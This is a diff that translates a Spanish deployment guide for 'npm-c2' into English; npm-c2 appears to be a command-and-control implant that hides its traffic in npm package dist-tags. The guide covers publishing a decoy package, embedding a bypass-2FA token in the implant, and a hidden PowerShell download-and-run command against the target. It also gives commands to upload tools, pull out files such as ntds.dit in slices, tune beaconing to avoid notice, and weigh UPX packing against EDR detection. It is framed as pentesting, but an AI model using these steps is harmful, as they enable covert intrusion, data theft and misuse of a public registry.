@@ -1,25 +1,24 @@
-# Puesta en marcha para un pentest real
+# Deployment for a real engagement
 
-> Nota: escrito para el transporte por dist-tags (v1.x). Para el transporte por
-> staging, que es el que npm sigue permitiendo a la automatización, mira
-> [README.md](README.md).
+> Note: written for the dist-tag transport (v1.x). For the staging transport,
+> which is what npm still allows to automation, see [README.md](README.md).
 
-Lo que necesitas para que este canal ejecute comandos de forma fiable, en
-orden, con lo que está comprobado contra el registro real de npm y con lo que
-solo se puede comprobar en tu despliegue.
+What you need for this channel to run commands reliably and in order, with what
+has been verified against the real npm registry and what can only be checked in
+your own deployment.
 
-## 1. Cuenta y paquete
+## 1. Account and package
 
-1. Cuenta en npmjs.com (una cuenta dedicada, no tu cuenta personal: el token
-   del implant da permiso de escritura sobre ese paquete).
-2. `npm init -y` en un directorio vacío, nombre aburrido y verosímil
-   (`npx-telemetry-collector`, `runtime-profiler`), y `npm publish`.
-3. Sube la versión una sola vez: el canal nunca toca la versión, solo los
+1. An npmjs.com account (a dedicated one, not your personal account: the
+   implant's token has write permission on that package).
+2. `npm init -y` in an empty directory, a boring and plausible name
+   (`npx-telemetry-collector`, `runtime-profiler`), then `npm publish`.
+3. Bump the version once: the channel never touches the version, only the
    dist-tags.
 
-## 2. Token: granular, no clásico
+## 2. Token: granular, not classic
 
-Los tokens legacy ya no existen (noviembre 2025). Lo que necesitas:
+Legacy tokens no longer exist (November 2025). What you need:
 
 ```sh
 npm login
@@ -31,28 +30,28 @@ npm token create \
   --expires 2026-12-31
 ```
 
-- `--packages <pkg>`: solo ese paquete. Un token filtrado no toca nada más.
-- `--read-write`: sin esto el implant ejecuta pero no puede responder.
-- `--bypass-2fa`: sin esto cada PUT pediría OTP.
-- `--expires`: ponlo corto. Lo vas a meter en un binario.
-- `--cidr` si tu equipo de salto tiene IP fija. Es la mejor mitigación real
-  del riesgo de tener el token en el implante.
+- `--packages <pkg>`: only that package. A leaked token touches nothing else.
+- `--read-write`: without it the implant runs but cannot reply.
+- `--bypass-2fa`: without it every PUT would ask for an OTP.
+- `--expires`: keep it short. You are putting it inside a binary.
+- `--cidr` if your jump host has a fixed IP. It is the best real mitigation for
+  having the token in the implant.
 
-El token tiene que empezar por `npm_`. `npm-c2 doctor` lo verifica antes de
-que pierdas tiempo en el despliegue.
+The token must start with `npm_`. `npm-c2 doctor` checks it before you waste
+time on a deployment.
 
-**Caducidad importante**: los tokens bypass-2FA pierden la capacidad de
-publicar en enero de 2027. Escritura de dist-tags y lectura no se ven
-afectadas por ese cambio (lo que se retira es publicar versiones nuevas), pero
-si el proyecto te tiene que durar, rota el token cada trimestre.
+**Expiry matters**: bypass-2FA tokens lose the ability to publish in January
+2027. Dist-tag writes and reads are not affected by that change (what is being
+retired is publishing new versions), but if the project has to last, rotate the
+token every quarter.
 
-## 3. Verificar antes de desplegar
+## 3. Verify before deploying
 
 ```sh
 npm-c2 doctor -p <pkg> -t npm_xxx
 ```
 
-Hace, contra el registro real:
+Against the real registry it does:
 
 ```
 [ok  ] token shape                        npm_* granular token
@@ -64,57 +63,57 @@ Hace, contra el registro real:
 [+] ready: the implant can poll and reply
 ```
 
-Cada línea es una petición HTTP real, y borra sus propias etiquetas de prueba.
-Si algo falla, `FAIL` y código de salida 2; si solo avisa, 1.
+Every line is a real HTTP request, and it deletes its own test tags. If
+something fails you get `FAIL` and exit code 2; if it only warns, 1.
 
-Esto es lo que **sí** he podido verificar desde esta máquina: la lectura sin
-autenticación va a 361-376 ms y el endpoint `/-/package/<pkg>/dist-tags`
-devuelve `cf-cache-status: DYNAMIC` (no se cachea en Cloudflare), mientras que
-el endpoint completo del paquete sí devuelve `HIT` con `max-age=300`. Es decir:
-la escritura debería verse en la siguiente lectura, sin los 60 s de caché que
-temía el README original. `doctor` te lo confirma con tu paquete concreto en
-vez de fiarse de esta medición.
+This is what **could** be verified from this machine: unauthenticated reads take
+361-376 ms and the `/-/package/<pkg>/dist-tags` endpoint returns
+`cf-cache-status: DYNAMIC` (not cached by Cloudflare), while the full package
+endpoint does return `HIT` with `max-age=300`. In other words: a write should be
+visible on the next read, without the 60 s of cache the original README feared.
+`doctor` confirms it against your own package instead of trusting this
+measurement.
 
-Lo que **no** he podido verificar: un PUT auténtico de verdad. No tengo token
-de npm y no voy a crear cuentas. Los 6 checks de escritura se han probado
-contra un registro simulado (`tests/mock_registry.py`) y contra el
-comportamiento documentado (`npm/cli/lib/commands/dist-tag.js`, que usa
+What could **not** be verified: a genuine authenticated PUT. The six write
+checks were tested against a mock registry (`tests/mock_registry.py`) and
+against documented behaviour (`npm/cli/lib/commands/dist-tag.js`, which uses
 `PUT /-/package/<escapedName>/dist-tags/<encodeURIComponent(tag)>`).
 
-## 4. Desplegar el implante
+## 4. Deploying the implant
 
 ```sh
-# ejecuta pero no responde  ->  solo para acciones ciegas
+# runs but does not reply  ->  blind actions only
 npm-c2 --generate-standalone -p <pkg> > implant.py
 
-# ejecuta y responde  ->  lo normal
+# runs and replies  ->  the normal case
 npm-c2 --generate-standalone -t npm_xxx -p <pkg> > implant.py
 
-# binario
+# binary (legacy Python builder)
 pip install pyinstaller
 build.bat npm_xxx <pkg>
 ```
 
-`build.bat` ahora verifica que el fichero generado parsea antes de llamar a
-pyinstaller: antes compilaba un traceback dentro de `node.exe` y el build
-"tenía éxito".
+The current path is the Go build (`native/build_go.py`); `build.bat` is kept
+for hosts without a Go toolchain. It validates that the generated file parses
+before calling PyInstaller, because it used to compile a traceback into
+`node.exe` and call the build successful.
 
-Ejecución en el objetivo:
+Running it on the target:
 
 ```powershell
 powershell -c "iwr -Uri http://10.0.0.1/node.exe -OutFile $env:TEMP\node.exe; Start-Process $env:TEMP\node.exe -Arg '-p <pkg> --interval 30' -WindowStyle Hidden"
 ```
 
-`--interval 30 --jitter 15` es un buen punto de partida: el ciclo completo
-(GET + ejecutar + PUT) tarda menos de un segundo, así que 30 s deja margen
-holgado sin parecer un beacon.
+`--interval 30 --jitter 15` is a good starting point: a full cycle (GET +
+execute + PUT) takes under a second, so 30 s leaves plenty of room without
+looking like a beacon.
 
-## 5. Uso: lo que cambió para que sea usable
+## 5. Usage: what changed to make it usable
 
-Antes había que hacer `task` y luego `poll` a mano. Ahora:
+Before, you had to `task` and then `poll` by hand. Now:
 
 ```sh
-# consola: escribes, recibes la salida
+# console: type, receive the output
 npm-c2 operator -p <pkg> -t npm_xxx shell
 
 c2> whoami
@@ -128,120 +127,119 @@ c2> out:j1
 Nmap scan report for 10.0.0.5 ...
 ```
 
-Y para scripting:
+And for scripting:
 
 ```sh
 npm-c2 operator -p <pkg> -t npm_xxx run "ipconfig /all" > ipconfig.txt
 npm-c2 operator -p <pkg> -t npm_xxx run --file collect.ps1 --timeout 600
 ```
 
-`run` espera la respuesta y devuelve código 3 si se agota el tiempo.
+`run` waits for the reply and returns exit code 3 if it times out.
 
-## 6. Comandos que necesitas en un pentest real
+## 6. Commands you need on a real engagement
 
-| necesidad | comando |
+| Need | Command |
 |---|---|
-| shell en el directorio correcto | `cd:C:\Users\victim\Desktop` y luego el comando |
-| tarea larga sin bloquear el beacon | `bg:nmap -sV -p- 10.0.0.0/24` + `out:j1` |
-| recoger un binario | `up:C:\Windows\Temp\out.zip` (12000 bytes por respuesta, usa `up:path:off:len` para el resto) |
-| subir herramienta | `dl:http://10.0.0.1/tool.exe:C:\Windows\Temp\tool.exe` |
-| PowerShell sin romper comillas | `ps:Get-ChildItem -Recurse $env:USERPROFILE` |
-| sacar un fichero grande por trozos | `up:C:\Users\u\ntds.dit:0:12000`, luego `:12000:12000`, etc. |
+| shell in the right directory | `cd:C:\Users\victim\Desktop` then the command |
+| long task without blocking the beacon | `bg:nmap -sV -p- 10.0.0.0/24` + `out:j1` |
+| collect a binary | `up:C:\Windows\Temp\out.zip` (12000 bytes per reply, use `up:path:off:len` for the rest) |
+| upload a tool | `dl:http://10.0.0.1/tool.exe:C:\Windows\Temp\tool.exe` |
+| PowerShell without breaking quotes | `ps:Get-ChildItem -Recurse $env:USERPROFILE` |
+| large file in slices | `up:C:\Users\u\ntds.dit:0:12000`, then `:12000:12000`, and so on |
 
-## 7. Antes de irte
+## 7. Before you leave
 
 ```sh
-npm-c2 operator -p <pkg> -t npm_xxx clean --all   # deja solo latest
-npm-c2 operator -p <pkg> -t npm_xxx stats         # 0 pendientes, 0 resultados
+npm-c2 operator -p <pkg> -t npm_xxx clean --all   # leaves only latest
+npm-c2 operator -p <pkg> -t npm_xxx stats         # 0 pending, 0 results
 ```
 
-El implante ya borra sus propias etiquetas de comando después de ejecutarlas
-(`AUTO_CLEAN`), así que el canal no crece sin control: el mapa de dist-tags no
-se llena de basura y el GET no se degrada.
+The implant deletes its own command tags after executing them (`AUTO_CLEAN`), so
+the channel does not grow without control: the dist-tag map does not fill with
+garbage and the GET does not degrade.
 
-Y revoca el token en npmjs.com cuando cierres el engagement. Es lo único que
-importa de verdad si el binario se queda por ahí.
+And revoke the token on npmjs.com when the engagement ends. It is the only
+thing that really matters if the binary stays out there.
 
-## 8. Límites que siguen ahí
+## 8. Limits that remain
 
-- **El token vive en el binario.** La ofuscación es XOR con
-  `SHA256(package)[:16]`; el nombre del paquete también está en el binario, así
-  que la clave también. Quien tenga el EXE tiene el token. Token corto, scoped
-  y con CIDR es la única mitigación real.
-- **Todo va en claro dentro del TLS.** Nombres y valores de tags los ve npm y
-  Cloudflare. No metas credenciales ni datos de cliente como comandos.
-- **Un solo hilo por implante.** Un comando largo bloquea el ciclo; para eso
-  está `bg:`.
-- **Sin cifrado de extremo a extremo del payload.** Base64 no es cifrado. Si
-  el compromiso del canal te importa, hay que añadir una capa de clave
-  simétrica que no viaje en el binario.
-- **Windows es el objetivo probado.** El código es multiplataforma (usa
-  `/bin/sh` fuera de Windows) pero el build y los metadatos `node.exe` son
+- **The token lives in the binary.** Obfuscation is XOR with
+  `SHA256(package)[:16]`; the package name is in the binary too, so the key is
+  too. Whoever has the EXE has the token. A short, scoped token with CIDR is the
+  only real mitigation.
+- **Everything travels in clear inside TLS.** npm and Cloudflare see tag names
+  and values. Do not put credentials or client data there.
+- **One thread per implant.** A long command blocks the cycle; that is what
+  `bg:` is for.
+- **No end-to-end payload encryption** in the dist-tag channel. Base64 is not
+  encryption; the staging transport does encrypt.
+- **Windows is the tested target.** The code is cross-platform (it uses
+  `/bin/sh` outside Windows) but the build and the `node.exe` metadata are
   Windows.
 
-## 9. Por qué Go y no Python para el binario
+## 9. Why Go and not Python for the binary
 
-El intento con PyInstaller compilando bajo Wine funcionó, pero dejó un bug que
-solo aparecía en la práctica: un build `--noconsole` no tiene consola, y en
-Windows el `subprocess` de Python puede fallar esperando sobre un handle de
-proceso inválido (`WinError 6`). El implante *arrancaba y hablaba con el canal*,
-pero devolvía la excepción en vez de la salida del comando. Se podía sortear,
-pero es fragilidad estructural del runtime, no del código.
+The PyInstaller attempt built under Wine worked, but left a bug that only showed
+up in practice: a `--noconsole` build has no console, and on Windows Python's
+`subprocess` can fail waiting on an invalid process handle (`WinError 6`). The
+implant *started and talked to the channel*, but returned the exception instead
+of the command output. It could be worked around, but it is structural runtime
+fragility, not a code bug.
 
-El port a Go elimina la clase entera de problema:
+The port to Go removes that whole class of problem:
 
 | | Python + PyInstaller | Go |
 |---|---|---|
-| tiempo de build | ~45 s bajo Wine | **0,9 s** en nativo |
-| tamaño | 7,9 MB | 6,6 MB (6,8 con recursos) |
-| dependencias en el objetivo | runtime embebido, DLL de VC | **ninguna** (estático) |
-| `--noconsole` | frágil (WinError 6) | nativo, sin consola por diseño |
-| arranque en frío | ~1-2 s (desempaqueta a %TEMP%) | ~50 ms |
-| icono / versión | PyInstaller | `windres` (mismo resultado) |
+| build time | ~45 s under Wine | **0.9 s** native |
+| size | 7.9 MB | 6.6 MB (6.8 with resources) |
+| dependencies on target | embedded runtime, VC DLLs | **none** (static) |
+| `--noconsole` | fragile (WinError 6) | native, no console by design |
+| cold start | ~1-2 s (unpacks to %TEMP%) | ~50 ms |
+| icon / version | PyInstaller | `windres` (same result) |
 
-El protocolo es idéntico y está verificado por `tests/test_go_parity.py`: un
-operador Python empuja tags y el implante Go los ejecuta, responde, y Python
-decodifica la respuesta. Los dos binarios son intercambiables en el canal.
+The protocol is identical and verified by `tests/test_go_parity.py`: a Python
+operator pushes tags and the Go implant executes and replies, and Python decodes
+the answer. Both binaries are interchangeable on the channel.
 
 ```sh
 python3 native/build_go.py -t npm_xxx -p <pkg>     # dist/node.exe
 python3 native/build_go.py --32                     # dist/node-x86.exe
 ```
 
-El port sigue conservando el Python (`npm-c2`, `build.bat`,
-`native/build_windows.py`) para cuando no haya toolchain de Go, pero el camino
-normal es el de Go.
+The port still keeps the Python path (`npm-c2`, `build.bat`,
+`native/build_windows.py`) for hosts without a Go toolchain, but the normal path
+is Go.
 
-## 10. Tamaño del binario: UPX
+## 10. Binary size: UPX
 
-El exe de Go sin comprimir son 6,8 MB (6,6 en 386). Con UPX se queda en **2,3 MB**,
-un 34%:
+The uncompressed Go exe is 6.8 MB (6.6 on 386). With UPX it drops to **2.3 MB**,
+a third:
 
 ```sh
 python3 native/build_go.py -p <pkg> -t <tok> --upx --32
-#   [+] upx: 6.839.808 -> 2.368.512 bytes (34.6%)
+#   [+] upx: 6,839,808 -> 2,368,512 bytes (34.6%)
 ```
 
-O en `c2.json`: `"upx": true`.
+Or in `c2.json`: `"upx": true`.
 
-Verificado que el binario comprimido **sigue ejecutando y respondiendo** en el
-canal: `tests/test_go_windows.py` pasa con el exe empaquetado, y el icono y los
-recursos de versión sobreviven (UPX comprime las secciones, no los recursos).
+Verified that the compressed binary **still runs and replies** on the channel:
+`tests/test_go_windows.py` passes with the packed exe, and the icon and version
+resources survive (UPX compresses sections, not resources).
 
-**El coste, que importa más que los megas:**
+**The cost, which matters more than the megabytes:**
 
-- Un exe empaquetado con UPX tiene las firmas `UPX0`/`UPX1` visibles en la
-  cabecera. Cualquier motor lo marca: Defender lo cataloga de `Wacatac`/
-  `Upatre` con frecuencia, y YARA tiene reglas triviales para `UPX!`.
-- La entropía alta por sección es en sí misma una señal.
-- No se puede firmar después sin romper el stub.
+- A UPX-packed exe has `UPX0`/`UPX1` signatures visible in the header. Every
+  engine flags it: Defender often labels it `Wacatac`/`Upatre`, and YARA has
+  trivial rules for `UPX!`.
+- High per-section entropy is itself a signal.
+- It cannot be signed afterwards without breaking the stub.
 
-Con 2,3 MB ganas ancho de banda y velocidad de transferencia; pierdes
-discreción. Para un engagement donde el binario se sirve desde tu infra y el
-objetivo tiene EDR, **es mejor los 6,8 MB sin UPX**: un Go sin empaquetar es
-mucho más aburrido para un motor que un UPX. Para un ejercicio sin EDR, o por
-SMB a un share interno, UPX va bien.
+With 2.3 MB you gain bandwidth and transfer speed; you lose discretion. For an
+engagement where the binary is served from your own infrastructure and the
+target has an EDR, **the 6.8 MB without UPX is better**: an unpacked Go binary
+is much less interesting to an engine than a UPX one. For an exercise with no
+EDR, or over SMB to an internal share, UPX is fine.
 
-Alternativa intermedia si lo que quieres es bajar tamaño sin firma UPX:
-quitar el `-H windowsgui` no ayuda (lo contrario), pero `-ldflags "-s -w"` ya
-está puesto; lo único que queda es UPX.
+The intermediate option if you want a smaller size without the UPX signature
+does not exist: removing `-H windowsgui` makes it worse, and `-ldflags "-s -w"`
+is already set. UPX is what is left.
